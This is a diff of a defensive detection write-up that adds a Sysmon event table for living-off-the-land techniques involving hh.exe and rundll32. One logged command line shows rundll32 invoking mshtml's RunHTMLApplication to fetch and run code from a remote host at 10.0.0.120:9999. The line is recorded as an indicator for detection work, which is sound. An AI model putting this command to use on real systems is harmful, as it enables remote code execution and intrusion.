@@ -52,6 +52,15 @@ C:\ hh.exe [].chm
 
 ## Sysmon 
 
+<h2> Detection </h2>
+
+## Sysmon 
+
+EventID | TaskCategory   | User  | SysmonVersion | Image                            |  Commandline 
+------- | ---------------|-------|---------------|----------------------------------| ------------
+1       | ProcessCreate  |SYSTEM | 9.1.0         | C:\Windows\System32\rundll32.exe | rundll32.exe hXXp://10.0.0.120:9999/test?FQB8ZFV7H0=d34bf69da4aa4518b984ca90256e2ed6;8PEBJG06VB=;\..\..\..\mshtml,RunHTMLApplication
+
+
 EventID | TaskCategory       | User  | SysmonVersion | Image             |  Commandline 
 ------- | ------------------ |-------|---------------|-------------------| ------------
 3       | NetworkConnection  | user   | 9.1.0         | C:\Windows\hh.exe | NA
